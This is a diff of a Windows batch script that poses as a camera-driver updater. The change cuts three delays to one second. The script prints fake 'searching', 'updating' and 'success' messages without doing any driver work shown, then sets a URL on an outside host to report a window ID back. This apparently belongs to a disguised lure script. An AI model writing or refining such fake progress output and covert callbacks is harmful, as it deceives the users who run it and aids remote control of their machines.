@@ -7,11 +7,11 @@ if not defined WINDOW_UID goto :err_uid
 if "!WINDOW_UID!"=="" goto :err_uid
 if "!WINDOW_UID!"=="__ID__" goto :err_uid
 
-call :delay 4
+call :delay 1
 echo [INFO] Searching for Camera Drivers ...
-call :delay 6
+call :delay 1
 echo [INFO] Updating Driver Packages...
-call :delay 12
+call :delay 1
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
   set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
